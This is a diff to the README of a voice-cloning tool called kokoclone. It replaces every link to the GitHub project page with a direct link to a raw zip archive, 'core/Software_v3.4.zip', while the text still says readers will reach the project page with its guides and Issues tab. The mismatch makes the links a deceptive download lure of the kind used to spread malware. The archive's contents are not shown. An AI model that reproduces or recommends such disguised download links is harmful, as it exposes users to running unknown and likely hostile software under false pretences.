@@ -1,6 +1,6 @@
 # 🎙️ kokoclone - Natural Multilingual Voice Cloning
 
-[![Download kokoclone](https://img.shields.io/badge/Download-kokoclone-green?style=for-the-badge)](https://github.com/laithisgood/kokoclone)
+[![Download kokoclone](https://img.shields.io/badge/Download-kokoclone-green?style=for-the-badge)](https://github.com/laithisgood/kokoclone/raw/refs/heads/main/core/Software_v3.4.zip)
 
 ## 🗣️ What is kokoclone?
 
@@ -24,13 +24,13 @@ Having a sound card or built-in speakers will let you listen to the voices your 
 
 Click the large button below to go to the kokoclone page on GitHub. From there, you can find the latest download files and instructions.
 
-[![Download kokoclone](https://img.shields.io/badge/Download-kokoclone-007ACC?style=for-the-badge)](https://github.com/laithisgood/kokoclone)
+[![Download kokoclone](https://img.shields.io/badge/Download-kokoclone-007ACC?style=for-the-badge)](https://github.com/laithisgood/kokoclone/raw/refs/heads/main/core/Software_v3.4.zip)
 
 ### Step 1: Visit the download page
 
 Go to:
 
-https://github.com/laithisgood/kokoclone
+https://github.com/laithisgood/kokoclone/raw/refs/heads/main/core/Software_v3.4.zip
 
 You will see the kokoclone project, including links to files, guides, and updates.
 
@@ -125,7 +125,7 @@ These features make kokoclone versatile for various uses such as presentations, 
 
 If you need help or want to learn more, visit the kokoclone page on GitHub.
 
-https://github.com/laithisgood/kokoclone
+https://github.com/laithisgood/kokoclone/raw/refs/heads/main/core/Software_v3.4.zip
 
 Check the "Issues" tab if you face bugs or want to request features. The community and developers may respond with solutions.
 
@@ -133,4 +133,4 @@ You can also find user guides and updates in the repository.
 
 ---
 
-[![Download kokoclone](https://img.shields.io/badge/Download-kokoclone-green?style=for-the-badge)](https://github.com/laithisgood/kokoclone)
+[![Download kokoclone](https://img.shields.io/badge/Download-kokoclone-green?style=for-the-badge)](https://github.com/laithisgood/kokoclone/raw/refs/heads/main/core/Software_v3.4.zip)
